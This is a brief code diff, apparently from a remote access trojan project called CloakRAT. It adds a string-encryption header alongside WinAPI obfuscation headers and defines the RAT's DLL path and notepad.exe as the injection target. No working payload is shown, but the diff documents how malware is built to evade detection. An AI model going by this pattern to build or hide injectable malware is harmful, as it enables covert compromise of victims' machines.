@@ -3,6 +3,7 @@
 #include "utils.h"
 #include "winapi_function_signatures.h"
 #include "winapi_obfuscation.h"
+#include "string_encryption.h"
 
 #define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll"
 #define TARGET_EXE "notepad.exe"
